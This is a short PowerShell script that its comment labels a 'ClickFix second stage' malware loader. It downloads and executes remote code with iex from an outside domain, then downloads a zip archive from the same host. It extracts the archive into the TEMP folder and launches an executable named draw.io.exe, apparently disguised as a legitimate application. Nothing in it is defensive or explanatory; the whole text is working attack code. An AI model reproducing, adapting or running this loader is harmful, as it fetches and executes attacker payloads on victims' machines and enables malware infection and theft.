# ClickFix second stage: fetches remote instructions, then pulls an archive
# payload, extracts it under TEMP, and launches the dropped executable.
$stageUrl = 'http://elxxvvx.xyz/f'
iex ((New-Object Net.WebClient).DownloadString($stageUrl))

$zipUrl = 'https://elxxvvx.xyz/update2.zip'
$zipPath = Join-Path $env:TEMP 'update26.zip'
Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath
$dest = Join-Path $env:TEMP 'update26'
Expand-Archive -Path $zipPath -DestinationPath $dest -Force
Start-Process -FilePath (Join-Path $dest 'draw.io.exe')
